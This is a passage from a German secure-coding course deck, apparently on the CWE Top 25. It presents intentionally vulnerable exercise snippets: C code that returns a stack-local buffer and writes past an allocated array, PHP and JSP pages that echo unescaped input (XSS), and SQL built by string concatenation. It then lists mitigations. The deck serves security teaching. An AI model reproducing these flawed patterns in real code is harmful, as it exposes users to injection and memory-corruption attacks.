MTAwMDAw:83OiIk4ae5YG0+22+XHWy97wT4INdXcYxRjGwAamYJk=:snLDTHVsItZLOWEE:ZaA6buaurZPVyrY07Qg58rEpZWLtQESsRXUW7A21iaVo44uKySTLVX8iFRu3/uioBf2ly+GWB4Rv0G/zOKK5VHuoKyDJz5aEPAqb6/IIzR09ne4Cqi5YAPH3XvLM1V/UBMg+5hBYPxVZtMknAxqsjuHBlNite0rFaNVxcb2nq4ovyeBgo1Hy88vIKfymrXX0L2XCuqaSoHdl11WP2aQr7K4izHln0033pns/1UrnlNOU82khhxcef5O+50GKuKz4HyM6M5jwRvHkJPdKZTnzql+hvx9KGVuhPDyhwFw4iiFptbf3H9PKJzzXhktT3+/7gnPrVZgtN9dI+u39yalW/vkrb/YNsU9KDdPaV8wzWLxKNaW0W63xU+uZ0+Xpr8/m4BX9A0LYjOfK1AYQdZmFf6DzgjOwMa/FcLrjgG9gpnlHMAF5bIRVCDmvIaXD2NlCZYg5JJWOPV6WZ0R2ObRJ3abdRMYBVZJi/ZF4X1+0aGPtEm4a3tSS+iWQ4/rVxm56bisEMLi00lKPOQgzvPl9U/dVQuhlJ9HU12QodbphHpslGKNjKOAJM64WKSfXCAd2QKT2XTHR4gBclN1GLsa9tbblpioUNh1qn+ZiKKfC+hRFrALHAqvTi4eEDL125xrEM46BfZIEYhRV8Mv4y9j+2/H6S3jo9LZ9VH3tJJDtH2h7bnMvyjKC1Vu8cCHQPgoot7YC4R46TlnleMe2r3eXLSYvp1mRvmYk0L2BTjBjTNMRIEuskze66Bfk+pmSdPQqhHrFJZLWzVXspHUs42hTHmL8RDYaoZnzYx73cYc6AEWEA39Vhiu+9/5reSC1sP+Pb5BNPdbX8CTGTR4qIfIx9z+XzKyfLHI+DIo6AdSffe3snQOOtYADGZBi1sq+eXqJSNDis1xdlXr6HhHqcKmRhWth2IrDuWITMZ6rGYMYElfDRxwJ2Q==</div>
</div>
</ld-card><ld-card class="incremental">
<div class="ld-exercise" data-exercise-id="4" data-exercise-title="4 - Whitespace Bearbeitung" id="ld-exercise-4">
<p class="ld-exercise-title rubric">Whitespace Bearbeitung</p>
<pre class="code C literal-block"><small class="ln"> 1 </small><code data-lineno=" 1 "><span class="keyword type">char</span><span class="operator">*</span><span class="whitespace"> </span><span class="name function">trimTrailingWhitespace</span><span class="punctuation">(</span><span class="keyword type">char</span><span class="whitespace"> </span><span class="operator">*</span><span class="name">strMessage</span><span class="punctuation">,</span><span class="whitespace"> </span><span class="keyword type">int</span><span class="whitespace"> </span><span class="name">length</span><span class="punctuation">)</span><span class="whitespace"> </span><span class="punctuation">{</span><span class="whitespace">
</span></code><small class="ln"> 2 </small><code data-lineno=" 2 "><span class="whitespace">    </span><span class="keyword type">char</span><span class="whitespace"> </span><span class="operator">*</span><span class="name">retMessage</span><span class="punctuation">;</span><span class="whitespace">
</span></code><small class="ln"> 3 </small><code data-lineno=" 3 "><span class="whitespace">    </span><span class="keyword type">char</span><span class="whitespace"> </span><span class="name">message</span><span class="punctuation">[</span><span class="name">length</span><span class="operator">+</span><span class="literal number integer">1</span><span class="punctuation">];</span><span class="whitespace">                    </span><span class="comment single">// copy input string to a
</span></code><small class="ln"> 4 </small><code data-lineno=" 4 "><span class="comment single"></span><span class="whitespace">    </span><span class="keyword type">int</span><span class="whitespace"> </span><span class="name">index</span><span class="punctuation">;</span><span class="whitespace">                                 </span><span class="comment single">//      temporary string
</span></code><small class="ln"> 5 </small><code data-lineno=" 5 "><span class="comment single"></span><span class="whitespace">    </span><span class="keyword">for</span><span class="whitespace"> </span><span class="punctuation">(</span><span class="name">index</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="literal number integer">0</span><span class="punctuation">;</span><span class="whitespace"> </span><span class="name">index</span><span class="whitespace"> </span><span class="operator">&lt;</span><span class="whitespace"> </span><span class="name">length</span><span class="punctuation">;</span><span class="whitespace"> </span><span class="name">index</span><span class="operator">++</span><span class="punctuation">)</span><span class="whitespace"> </span><span class="punctuation">{</span><span class="whitespace"> </span><span class="comment single">//
</span></code><small class="ln"> 6 </small><code data-lineno=" 6 "><span class="comment single"></span><span class="whitespace">        </span><span class="name">message</span><span class="punctuation">[</span><span class="name">index</span><span class="punctuation">]</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="name">strMessage</span><span class="punctuation">[</span><span class="name">index</span><span class="punctuation">];</span><span class="whitespace">    </span><span class="comment single">//
</span></code><small class="ln"> 7 </small><code data-lineno=" 7 "><span class="comment single"></span><span class="whitespace">    </span><span class="punctuation">}</span><span class="whitespace">                                          </span><span class="comment single">//
</span></code><small class="ln"> 8 </small><code data-lineno=" 8 "><span class="comment single"></span><span class="whitespace">    </span><span class="name">message</span><span class="punctuation">[</span><span class="name">index</span><span class="punctuation">]</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="literal string char">'\0'</span><span class="punctuation">;</span><span class="whitespace">                     </span><span class="comment single">//
</span></code><small class="ln"> 9 </small><code data-lineno=" 9 "><span class="comment single"></span><span class="whitespace">
</span></code><small class="ln">10 </small><code data-lineno="10 "><span class="whitespace">    </span><span class="keyword type">int</span><span class="whitespace"> </span><span class="name">len</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="name">index</span><span class="literal number integer">-1</span><span class="punctuation">;</span><span class="whitespace">                         </span><span class="comment single">// trim trailing whitespace
</span></code><small class="ln">11 </small><code data-lineno="11 "><span class="comment single"></span><span class="whitespace">    </span><span class="keyword">while</span><span class="whitespace"> </span><span class="punctuation">(</span><span class="name">isspace</span><span class="punctuation">(</span><span class="name">message</span><span class="punctuation">[</span><span class="name">len</span><span class="punctuation">]))</span><span class="whitespace"> </span><span class="punctuation">{</span><span class="whitespace">            </span><span class="comment single">//
</span></code><small class="ln">12 </small><code data-lineno="12 "><span class="comment single"></span><span class="whitespace">        </span><span class="name">message</span><span class="punctuation">[</span><span class="name">len</span><span class="punctuation">]</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="literal string char">'\0'</span><span class="punctuation">;</span><span class="whitespace">                   </span><span class="comment single">//
</span></code><small class="ln">13 </small><code data-lineno="13 "><span class="comment single"></span><span class="whitespace">        </span><span class="name">len</span><span class="operator">--</span><span class="punctuation">;</span><span class="whitespace">                                 </span><span class="comment single">//
</span></code><small class="ln">14 </small><code data-lineno="14 "><span class="comment single"></span><span class="whitespace">    </span><span class="punctuation">}</span><span class="whitespace">                                          </span><span class="comment single">//
</span></code><small class="ln">15 </small><code data-lineno="15 "><span class="comment single"></span><span class="whitespace">    </span><span class="name">retMessage</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="name">message</span><span class="punctuation">;</span><span class="whitespace">
</span></code><small class="ln">16 </small><code data-lineno="16 "><span class="whitespace">    </span><span class="keyword">return</span><span class="whitespace"> </span><span class="name">retMessage</span><span class="punctuation">;</span><span class="whitespace">                         </span><span class="comment single">// return trimmed string
</span></code><small class="ln">17 </small><code data-lineno="17 "><span class="comment single"></span><span class="punctuation">}</span></code></pre>
<div class="ld-exercise-solution" data-encrypted="true">
MTAwMDAw:7FwPO/nfry5zz34+rOdYCoMVMZRi+xzx8oFndsP70pg=:XQAYbwTH73Eg3ARu:Kg/NsSkIuVc4QBV5RprNGWNqrkp3RyVuyQ30mPDzDPV0Ae9rFmeeomXQKt5od8Ml7ftRTvToQhE3l3Kc8IGw/+LM0SrxYV7roG2hIqb1BuLcGNoy+xY01qSJeXFtuMLu2xNOuyy80Ip/X5PkbuIcnLxjICI72/Z49i3fgqCG0r6gxc061lpCsgl5zF7+EbIt4DzNiQk+zVQrEluc1ZAwErYdAA1aO2AcI6yImTqmisZSLjV+mLgRQjKmKLotrmwBHaXvk1MLWHfoGq1dhDbOlEhGUBQwSMAedFs+tI7oFonbPs5CK6nzGAZtxMko6FRyMEhHKKE=</div>
</div>
<div class="supplemental docutils container">
<p class="rubric">Auszug aus der Dokumentation von <code class="c"><span class="name">isspace</span><span class="punctuation">()</span></code></p>
<blockquote class="epigraph">
<p>If an argument (character) passed to the <code class="c"><span class="name">isspace</span><span class="punctuation">()</span></code> function is a white-space character, it returns non-zero integer. If not, it returns 0.</p>
</blockquote>
</div>
</ld-card><ld-card class="incremental">
<div class="ld-exercise" data-exercise-id="5" data-exercise-title="5 - „Widgets”" id="ld-exercise-5">
<p class="ld-exercise-title rubric">„Widgets”</p>
<pre class="code C literal-block"><small class="ln"> 1 </small><code data-lineno=" 1 "><span class="keyword type">int</span><span class="whitespace"> </span><span class="name">i</span><span class="punctuation">;</span><span class="whitespace">
</span></code><small class="ln"> 2 </small><code data-lineno=" 2 "><span class="whitespace"></span><span class="keyword type">unsigned</span><span class="whitespace"> </span><span class="keyword type">int</span><span class="whitespace"> </span><span class="name">numWidgets</span><span class="punctuation">;</span><span class="whitespace">
</span></code><small class="ln"> 3 </small><code data-lineno=" 3 "><span class="whitespace"></span><span class="name">Widget</span><span class="whitespace"> </span><span class="operator">**</span><span class="name">WidgetList</span><span class="punctuation">;</span><span class="whitespace">
</span></code><small class="ln"> 4 </small><code data-lineno=" 4 "><span class="whitespace">
</span></code><small class="ln"> 5 </small><code data-lineno=" 5 "><span class="whitespace"></span><span class="name">numWidgets</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="name">GetUntrustedSizeValue</span><span class="punctuation">();</span><span class="whitespace">
</span></code><small class="ln"> 6 </small><code data-lineno=" 6 "><span class="whitespace"></span><span class="keyword">if</span><span class="whitespace"> </span><span class="punctuation">((</span><span class="name">numWidgets</span><span class="whitespace"> </span><span class="operator">==</span><span class="whitespace"> </span><span class="literal number integer">0</span><span class="punctuation">)</span><span class="whitespace"> </span><span class="operator">||</span><span class="whitespace"> </span><span class="punctuation">(</span><span class="name">numWidgets</span><span class="whitespace"> </span><span class="operator">&gt;</span><span class="whitespace"> </span><span class="name">MAX_NUM_WIDGETS</span><span class="punctuation">))</span><span class="whitespace"> </span><span class="punctuation">{</span><span class="whitespace">
</span></code><small class="ln"> 7 </small><code data-lineno=" 7 "><span class="whitespace">    </span><span class="name">ExitError</span><span class="punctuation">(</span><span class="literal string">&quot;Incorrect number of widgets requested!&quot;</span><span class="punctuation">);</span><span class="whitespace">
</span></code><small class="ln"> 8 </small><code data-lineno=" 8 "><span class="whitespace"></span><span class="punctuation">}</span><span class="whitespace">
</span></code><small class="ln"> 9 </small><code data-lineno=" 9 "><span class="whitespace"></span><span class="name">WidgetList</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="punctuation">(</span><span class="name">Widget</span><span class="whitespace"> </span><span class="operator">**</span><span class="punctuation">)</span><span class="name">malloc</span><span class="punctuation">(</span><span class="name">numWidgets</span><span class="whitespace"> </span><span class="operator">*</span><span class="whitespace"> </span><span class="keyword">sizeof</span><span class="punctuation">(</span><span class="name">Widget</span><span class="whitespace"> </span><span class="operator">*</span><span class="punctuation">));</span><span class="whitespace">
</span></code><small class="ln">10 </small><code data-lineno="10 "><span class="whitespace"></span><span class="name">printf</span><span class="punctuation">(</span><span class="literal string">&quot;WidgetList ptr=%p</span><span class="literal string escape">\n</span><span class="literal string">&quot;</span><span class="punctuation">,</span><span class="whitespace"> </span><span class="name">WidgetList</span><span class="punctuation">);</span><span class="whitespace">
</span></code><small class="ln">11 </small><code data-lineno="11 "><span class="whitespace"></span><span class="keyword">for</span><span class="punctuation">(</span><span class="name">i</span><span class="operator">=</span><span class="literal number integer">0</span><span class="punctuation">;</span><span class="whitespace"> </span><span class="name">i</span><span class="operator">&lt;</span><span class="name">numWidgets</span><span class="punctuation">;</span><span class="whitespace"> </span><span class="name">i</span><span class="operator">++</span><span class="punctuation">)</span><span class="whitespace"> </span><span class="punctuation">{</span><span class="whitespace">
</span></code><small class="ln">12 </small><code data-lineno="12 "><span class="whitespace">    </span><span class="name">WidgetList</span><span class="punctuation">[</span><span class="name">i</span><span class="punctuation">]</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="name">InitializeWidget</span><span class="punctuation">();</span><span class="whitespace">
</span></code><small class="ln">13 </small><code data-lineno="13 "><span class="whitespace"></span><span class="punctuation">}</span><span class="whitespace">
</span></code><small class="ln">14 </small><code data-lineno="14 "><span class="whitespace"></span><span class="name">WidgetList</span><span class="punctuation">[</span><span class="name">numWidgets</span><span class="punctuation">]</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="name builtin">NULL</span><span class="punctuation">;</span><span class="whitespace">
</span></code><small class="ln">15 </small><code data-lineno="15 "><span class="whitespace"></span><span class="name">showWidgets</span><span class="punctuation">(</span><span class="name">WidgetList</span><span class="punctuation">);</span></code></pre>
<div class="ld-exercise-solution" data-encrypted="true">
MTAwMDAw:EfjNxaESYdmevYCaWfzD6SJJe5l1nfP1gAcxa54kFqo=:h4OXdAqxlW3Dznxq:9K3VkUQESZtJUkrglk+VPTXSB5fK2TuTMBdUtaRAPyymTZtZgO9JMmGdGnRm4SJ09jg79wuHRFO3+YTbNpo/dlVSAknhIgmeUYXkUfMeASa2DgaZa6Jk/cUqpQy1/FAoZRnkEEeRv35KkzzCTCm8fmPfwl1lOCw/P8ZBb/7DqDrbUdCXulMi3PfERBfPZzUFj8h9iSgaPNmJKQ3mwF4O5sI9rMlXNDOCs8KTgvw1sEV8CA7oYvbHkO5lyMpecDxnAtOnRBayInp9LJBITNS/+OH7PQw2W07nDq8KHO86mccTRsm0Vvd7aKwDNgNlz3t0O5SvI0gFJcSqbwBahDhiuIpi51pICmVH7mlPo95QCqRd2y/94Zhbo5f9s6r8bl7AANOHFDF80qlsFwP2fk+inRDyBpH3SlrphnwqSs7076q9zxrYtfM4ou7qHmHEVw0gxHWvs7Fpu96/MX+s2Q5u12YSh1emcFfovaGniXLEGD1Ruv7Q32xnhI3DmcX7VFLa8MesLhW3+BfiTZwf6K4fpaKL+Q9BNKI6TGDJzy336lFuLU8PYOaH/9ojfp6HkRMvkRClAEDGZjLhzZF8t0T6jXpaaaLYYuF4QDdLYO9kfHnGPHJ4qEMmPI21Bu3uKy0Kwh24Q9PkRk4aGfMRbrNGKDqUqfNlkGaYHNWehdK7e313ZE5VTR/a/K4J7d/Vq0e65ADjCAcXi91VopvkJ4sRtMTeO3tlo3aDRHP2xgaw1BYv37I4OvPR1rbYkrNUMoLSkBps9lCJ</div>
</div>
</ld-card><ld-card class="incremental">
<p class="rubric">Mögliche Abhilfemaßnahmen</p>
<ul class="incremental-list">
<li><p>Verwendung einer sicheren Programmiersprache (Java, Rust ...)</p></li>
<li><p>Verwendung von Bibliotheken, die sicher(er) sind (z. B. <code class="c"><span class="name">strncpy</span><span class="punctuation">()</span></code> statt <code class="c"><span class="name">strcpy</span><span class="punctuation">()</span></code>)</p></li>
<li><p>Kompilierung mit entsprechenden Flags, die entsprechende Prüfung aktivieren (z. B. <code>-D_FORTIFY_SOURCE=2</code>)</p></li>
<li><p>Kompilierung als Position-Independent-Code</p>
<p><span class="peripheral">Dies löst nicht das Problem, aber es macht es schwerer eine Schwachstelle auszunutzen.</span></p>
</li>
<li><p>Statische Analyse Werkzeuge</p></li>
<li><p>Dynamische Analyse Werkzeuge (z. B. <em>Fuzzing</em>, <em>Fault Injection</em>, ...)</p></li>
</ul>
</ld-card></ld-deck></ld-topic>
<ld-topic class="new-subsection transition-move-to-top" id="cwe-79-improper-neutralization-of-input-during-web-page-generation-cross-site-scripting-or-xss">
<h2>CWE-79: Improper Neutralization of Input During Web Page Generation (<em>Cross-site Scripting</em> or <em>XSS</em>)</h2>
<div class="section-subtitle docutils container">
<p class="rubric">CWE Rank</p>
<table class="booktabs table-data-align-left table-header-align-left" style="width: 100%;">
<colgroup>
<col style="width: 40.0%" />
<col style="width: 60.0%" />
</colgroup>
<thead>
<tr><th class="head"><p>Jahr</p></th>
<th class="head"><p>Position</p></th>
</tr>
</thead>
<tbody>
<tr><td><p>2024</p></td>
<td><p>#1</p></td>
</tr>
<tr><td><p>2023</p></td>
<td><p>#2</p></td>
</tr>
</tbody>
</table>
</div>
</ld-topic>
<ld-topic id="cwe-79-cross-site-scripting">
<h2>CWE-79: <em>Cross-site Scripting</em></h2>
<dl class="field-list simple">
<dt>Kurzbeschreibung<span class="colon">:</span></dt>
<dd><p>Nutzereingaben werden nicht oder falsch bereinigt, bevor sie in die Ausgabe eingefügt werden, die als Webseite für andere Benutzer verwendet wird.</p>
</dd>
</dl>
<dl class="field-list simple">
<dt>Wahrscheinlichkeit des Missbrauchs<span class="colon">:</span></dt>
<dd><p>Hoch</p>
</dd>
<dt>Technische Auswirkungen<span class="colon">:</span></dt>
<dd><p>Speichermodifikation; DoS: Crash, Beendigung oder Neustart; Ausführen von nicht autorisiertem Code oder Befehlen</p>
</dd>
<dt>Betrifft<span class="colon">:</span></dt>
<dd><p>Zugriffskontrolle, Vertraulichkeit</p>
</dd>
<dt>Typen<span class="colon">:</span></dt>
<dd><p>Stored XSS (Typ 2), Reflected XSS (Typ 1), DOM-based XSS (Typ 0)</p>
</dd>
</dl>
<div class="supplemental docutils container">
<p>Durch eine XSS Lücke werden häufig Informationen abgegriffen (z. B. Session Cookies). Allerdings ist es ggf. auch möglich, dass der Angreifer die Session des Nutzers übernimmt und sich als dieser ausgibt.</p>
</div>
</ld-topic>
<ld-topic id="cwe-79-cross-site-scripting-stored-xss-typ-2">
<h2>CWE-79: <em>Cross-site Scripting</em>: Stored XSS (Typ 2)</h2>
<object aria-label="Stored XSS" class="align-center" data="images/xss/stored-xss.svg" role="img" type="image/svg+xml">
</object></ld-topic>
<ld-topic id="cwe-79-cross-site-scripting-reflected-xss-typ-1">
<h2>CWE-79: <em>Cross-site Scripting</em>: Reflected XSS (Typ 1)</h2>
<object aria-label="Reflected XSS" class="align-center" data="images/xss/reflected-xss.svg" role="img" type="image/svg+xml">
</object><div class="supplemental docutils container">
<p>Reflected XSS ist häufig schwerer auszunutzen, da der Angreifer den Nutzer dazu bringen muss, einen Link zu klicken, der den Angriffsvektor enthält. Bei Stored XSS ist dies nicht notwendig, da der Angriffsvektor bereits auf dem Server gespeichert ist.</p>
</div>
</ld-topic>
<ld-topic id="cwe-79-cross-site-scripting-dom-based-xss-typ-0">
<h2>CWE-79: <em>Cross-site Scripting</em>: Dom-based XSS (Typ 0)</h2>
<object aria-label="Dom-based XSS" class="align-center" data="images/xss/dom-based-xss.svg" role="img" type="image/svg+xml">
</object><div class="supplemental docutils container">
<p>Dom-based XSS ist am schwersten Auszunutzen, da der Angreifer den Nutzer dazu bringen muss den Schadcode in die Informationen einzubringen, die von dem Script verarbeitet werden (z. B. durch das Eingeben in ein Formular).</p>
</div>
</ld-topic>
<ld-topic id="cwe-79-xss">
<h2>CWE-79: XSS</h2>
<ld-deck>
<ld-card>
<div class="ld-exercise" data-exercise-id="6" data-exercise-title="6 - XSS Typ 1 (Php)" id="ld-exercise-6">
<p class="ld-exercise-title rubric">XSS Typ 1 (Php)</p>
<pre class="code php literal-block"><small class="ln">1 </small><code data-lineno="1 "><span class="other"># Rückgabe einer Willkommensnachricht basierend auf dem
</span></code><small class="ln">2 </small><code data-lineno="2 "><span class="other"># HTTP Get username Parameter
</span></code><small class="ln">3 </small><code data-lineno="3 "><span class="other">$username = $_GET['username'];
</span></code><small class="ln">4 </small><code data-lineno="4 "><span class="other">echo '&lt;div class=&quot;header&quot;&gt; Welcome, ' . $username . '&lt;/div&gt;';</span></code></pre>
<div class="ld-exercise-solution" data-encrypted="true">
MTAwMDAw:sPU03SO+14vQnZ7ohW5JJfA79fA0Ulg92JoAdFD5nDY=:+4ki/IKlVmeCuN5V:+kH0gSgZm4RujDm98t4UhhMocD9z2HBOAU8C6gBS0EMUFFdUPdVgqHCYWvD1rGHmorXpLhauVPTQrdORzNHOCiT/R/2UuoEX6gGjDLjPn3cabkQILMkrsY2y3fPVoMzxTsm2xR7yfC7jzEuYUmQ4g9Os0kinH6/NeAgS6dLWQm69GRMTc1myN+XrTE9VcMQpLfyIfEkfpXgcNh+4KnW+P920WVcLM/Blqen7fVFB7Kj8x5mweDxsG/N7N+4XyYooRqSMGoQtuPFt92jZ2/rpcot1v3eNdPo+H4SNkQLICEAhwukBAApVSwM2/UImp4git1mvA3v9RAc5VFnWfd3fDaz+F8fxwNXGbc5M5YYurMurK+KErjDCh9odZlUg+QSG8TvuAxznc2XOTxo02pbF9QzVeTAzRnVLvh3VHIZ6igDV/gcbwnEPtVMyTnGriRJCrw1GfpcUCcHdw9zsivMJeYomphn306VvGFCq+XgXRwsEcoYgBxFoL98/HBEeshoTbdj0y/OZPbAeTw7RtrXvoYRV6E0wT+64MpGf6w0R+ZMbRevY+2ne5/v8IRU95BV0kxNJRxmxpP+ygl7wS+4AzDxgneAieIpbo2KoqNYQoAsEF/DDXleKOrkCOzz/w18QEYpuuLPxRbPWPeUHE+t0gxZDUOjN5fIKZHIJy4SwsTBH/b2MJ1RAGraRASWy4N8Tm2GPnG4qslrs9pgARn6+d2fiqCDM6z9SYAa3HlWs7hDlyrAO6el0n7oG2vxCVpGQk3AeWUFfsAcHoG6VZGgGEg==</div>
</div>
</ld-card><ld-card class="incremental">
<div class="ld-exercise" data-exercise-id="7" data-exercise-title="7 - XSS Typ 2 (JSP)" id="ld-exercise-7">
<p class="ld-exercise-title rubric">XSS Typ 2 (JSP)</p>
<pre class="code jsp literal-block"><small class="ln"> 1 </small><code data-lineno=" 1 "><span class="keyword">&lt;%</span><span class="whitespace">  </span><span class="name">String</span><span class="whitespace"> </span><span class="name">eid</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="name">request</span><span class="punctuation">.</span><span class="name attribute">getParameter</span><span class="punctuation">(</span><span class="literal string">&quot;eid&quot;</span><span class="punctuation">);</span><span class="whitespace">
</span></code><small class="ln"> 2 </small><code data-lineno=" 2 "><span class="whitespace">    </span><span class="name">Statement</span><span class="whitespace"> </span><span class="name">stmt</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="name">conn</span><span class="punctuation">.</span><span class="name attribute">createStatement</span><span class="punctuation">();</span><span class="whitespace">
</span></code><small class="ln"> 3 </small><code data-lineno=" 3 "><span class="whitespace">    </span><span class="name">ResultSet</span><span class="whitespace"> </span><span class="name">rs</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="name">stmt</span><span class="punctuation">.</span><span class="name attribute">executeQuery</span><span class="punctuation">(</span><span class="literal string">&quot;select * from emp where id=&quot;</span><span class="operator">+</span><span class="name">eid</span><span class="punctuation">);</span><span class="whitespace">
</span></code><small class="ln"> 4 </small><code data-lineno=" 4 "><span class="whitespace">    </span><span class="keyword">if</span><span class="whitespace"> </span><span class="punctuation">(</span><span class="name">rs</span><span class="whitespace"> </span><span class="operator">!=</span><span class="whitespace"> </span><span class="keyword constant">null</span><span class="punctuation">)</span><span class="whitespace"> </span><span class="punctuation">{</span><span class="whitespace">
</span></code><small class="ln"> 5 </small><code data-lineno=" 5 "><span class="whitespace">        </span><span class="name">rs</span><span class="punctuation">.</span><span class="name attribute">next</span><span class="punctuation">();</span><span class="whitespace">
</span></code><small class="ln"> 6 </small><code data-lineno=" 6 "><span class="whitespace">        </span><span class="name">String</span><span class="whitespace"> </span><span class="name">name</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="name">rs</span><span class="punctuation">.</span><span class="name attribute">getString</span><span class="punctuation">(</span><span class="literal string">&quot;name&quot;</span><span class="punctuation">);</span><span class="whitespace">
</span></code><small class="ln"> 7 </small><code data-lineno=" 7 "><span class="whitespace">    </span><span class="punctuation">}</span><span class="whitespace">
</span></code><small class="ln"> 8 </small><code data-lineno=" 8 "><span class="whitespace"></span><span class="keyword">%&gt;</span><span class="whitespace">
</span></code><small class="ln"> 9 </small><code data-lineno=" 9 "><span class="whitespace">
</span></code><small class="ln">10 </small><code data-lineno="10 "><span class="whitespace"></span>Employee<span class="whitespace"> </span>Name:<span class="whitespace"> </span><span class="keyword">&lt;%=</span><span class="whitespace"> </span><span class="name">name</span><span class="whitespace"> </span><span class="keyword">%&gt;</span></code></pre>
<div class="ld-exercise-solution" data-encrypted="true">
MTAwMDAw:C4/tVReqz7GPgwvqsg7oQqVgNh5CBalAnKXkcuahCss=:rristvk9k9qh8/SY:XkZoLB5QBTSzRwHSN801tChwvorXqpTp7nIFCIDedPgO2r5zU/5wPLQl2DbSrPP+gmNUOkwYI3WfQHfwFSw0ZOunxu+ukBC7ylT1Dr6906dARGRQ33SnDr4MW9tmI4joPbO+3Pi2hTLPF5O7Vs2buhWiD1piMzetB2MAdjzVh0s0jyrNMdVUL+fVWhqokKFu9eyfWm6bGKD+a3YvynMJbIj4FZ2djO247aWWTbK0of3FXZ+/G3d+6Wdo+rEkfbE0VpYZZGJRweT5lB5bdJAixitgj747494KLJNGPS0wnJYiq+Wv87b8VWNPyYSmMGN3Z1ZtmLOCj0TLO6PKce6+4psMEf6SvonpvrphqoLqApe0LNkx2kJ/D0TAeiquVD4n1f5btIQWUa6YwrK5WoFzLkpNrWVfDn9niD/OprKuQ/ZM68TC0/7nVGTMrfvpOyfVMnSk01lzTw75WjfpVq21To8OiCR77y6lh1kfly8lxnmfEPcS1/5SXbrlC79lFjbK5T9CuvEAYAUfOshLex45oplnXcl+YZiJuc6QFq48P2SOJOoFwZIYjPHtrCDHoNZan8dzUnoVYcY2QZTFeIL/yQ8mnZOY1hkssaeics5jaPghgm9VAUySAxYCZeODZ1LxZbqx9Xjga7gxPsD8ktu7rguDzhjIQ+v6L+GRA89yMhhX6CqL4UmM6TCFduQwYi/FStPCpSmYnSJ4wXslXdPMTPyWC1Fxtw9nsvflrPIyn1nIppiXGN1y0kOiBaTZbjktX2u7B6Bz8rbJowOGFg==</div>
</div>
</ld-card><ld-card class="incremental">
<div class="ld-exercise" data-exercise-id="8" data-exercise-title="8 - XSS Typ 2 (PHP)" id="ld-exercise-8">
<p class="ld-exercise-title rubric">XSS Typ 2 (PHP)</p>
<pre class="code php literal-block"><small class="ln">1 </small><code data-lineno="1 "><span class="other">$username = mysql_real_escape_string($username);
</span></code><small class="ln">2 </small><code data-lineno="2 "><span class="other">$fullName = mysql_real_escape_string($fullName);
</span></code><small class="ln">3 </small><code data-lineno="3 "><span class="other">$query = sprintf('Insert Into users (uname,pwd,fname) Values (&quot;%s&quot;,&quot;%s&quot;,&quot;%s&quot;)',
</span></code><small class="ln">4 </small><code data-lineno="4 "><span class="other">                $username,
</span></code><small class="ln">5 </small><code data-lineno="5 "><span class="other">                crypt($password),
</span></code><small class="ln">6 </small><code data-lineno="6 "><span class="other">                $fullName) ;
</span></code><small class="ln">7 </small><code data-lineno="7 "><span class="other">mysql_query($query);
</span></code><small class="ln">8 </small><code data-lineno="8 "><span class="other">...</span></code></pre>
<div class="ld-exercise-solution" data-encrypted="true">
MTAwMDAw:zNrN359bqjDz8GTdFCnIWuQa+IorsagFw51kOzkEg9Q=:dLVv7DKF/UuX9Ecz:kauo1wsz4RZ/z7qFvCo5yS4AkOthI+xfsIn5jAz2z2jvCqwwtJdfo7D0W589HTt98jDdncugtx/B23jZm3dl3hR4dKJ50fV81kyZQRlxroh8MmVzduaWutNPwG2Kk1cl2e2oztpY4SQdk5fsAwBOV9aCWdjr0DYMTSvqqrfBl7tGKZnm3FK7QOPehqpWtOJTzwC9srJDTC+4xQtz6xUGZ409lkvyIzMJ7/18S0wML9hvlH9mcjMsfRG/j+WXteA9f306mys1vE8crmgBNp/wvdIiznhP5pFFGZyR0q4RywQHCOLvSy51CuK6e5vinnKNw6q9CpFSOPUD+g6aKHLs95ZrfHEqtMfOYopAkouzEkXqHPVO7DOTzfDq4Ltc9cAGXETKzjBp6UfoN1xyymNWPtf/+h3SPBX3nQaV1P2mq7FvXqGO+Z5Nly0bxqnft8RAhJbVGBzFLH8Z2G7o2l7JawowD+P7/oMENfGUmyT3FypoMDqN749o7x6iskl2adEmcycqxeZjM6gNc3VkblWrk3cDbpOoLAskTUy3dVCqnDengsOmvwikOi/RcDgCyFOPnw==</div>
</div>
</ld-card></ld-deck></ld-topic>
<ld-topic id="cwe-79-cross-site-scripting-1">
<h2>CWE-79: <em>Cross-site Scripting</em>:</h2>
<p class="rubric">Abhilfemaßnahmen, Erkennung und Abwehr</p>
<ld-deck class="incremental">
<ld-card>
<p class="rubric">Eingabevalidierung</p>
<aside class="admonition important">
<p class="admonition-title">Wichtig</p>
<div class="text-align-center docutils container">
<p>Prüfe jeden Input!</p>
</div>
</aside>
<div class="incremental docutils container">
<p>Prüfung, dass alle auf dem Client durchgeführten Prüfungen auch auf dem Server vorgenommen werden.</p>
</div>
</ld-card><ld-card class="incremental">
<p class="rubric">Cookies Verwendung</p>
<ul class="simple">
<li><p>Verringerung der Angriffsfläche mit dem Ziel möglichst wenig Daten in Cookies etc. zu speichern.</p></li>
<li><p>Verwendung von HttpOnly Cookies (d. h. Cookies, die nicht über JavaScript ausgelesen werden können).</p></li>
</ul>
</ld-card><ld-card class="incremental">
<p class="rubric">Entwicklungszeit</p>
<ul class="simple">
<li><p>Beherzigen von Best Practices (<a class="reference external" href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">XSS Prevention Cheat Sheet</a>)</p></li>
<li><p>Verwendung von geprüften/sicheren APIs</p></li>
<li><p>Statische Analyse Werkzeuge</p></li>
</ul>
</ld-card><ld-card class="incremental">
<p class="rubric">Setzen der CSP (Content Security Policy)<a class="brackets" href="#footnote-1" id="footnote-reference-1" role="doc-noteref"><span class="fn-bracket">[</span>1<span class="fn-bracket">]</span></a></p>
